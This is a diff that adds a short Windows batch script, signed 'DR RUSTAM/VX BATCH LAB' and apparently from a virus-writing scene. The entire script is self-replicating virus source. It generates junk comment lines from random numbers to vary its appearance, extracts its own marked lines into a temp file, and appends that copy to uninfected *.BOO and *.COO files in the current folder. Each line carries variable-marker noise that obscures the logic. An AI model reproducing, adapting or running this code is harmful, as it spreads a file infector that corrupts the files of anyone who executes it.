@@ -1,0 +1,24 @@
+
+=================[ trash gen ]==================
+
+%ZZB%@ECHO OFF&SET I=%0&SET Y=B;O;K;Y;N;M;H;V;D;S;X;R;U;G;A;L
+%ZZO%@FOR %%_ IN (%Y%) DO CALL :ZZO %%_ %RANDOM%%RANDOM%
+:ZZO
+%ZZY%IF %1_==_ (GOTO ZZ%D%D) ELSE (
+%ZZM%@ECHO:^::%2%2%2%2%2%2>>ZZ
+%ZZM%@FIND "ZZ%1"<%I%>>ZZ
+)%ZZM%&EXIT /B
+:ZZD
+%ZZS%@FOR %%B IN (*.BOO *.COO) DO CALL :SZZ "%%B"
+%ZZX%GOTO EZZ
+:SZZ %ZZR%
+%ZZU%@FIND "ZZ"<%1>NUL
+%ZZG%IF ERRORLEVEL 1 type ZZ>>%1
+:EZZ %ZZL%
+%ZZL% DEL ZZ %ZZL%
+
+===-=-=-=-=-=---==-==-=-==-=-=-=-====-=-=-=-=-===-=-=-
+
+====-------=-==-===-----==
+| DR RUSTAM/VX BATCH LAB |
+====--=-====-----=-=-====-
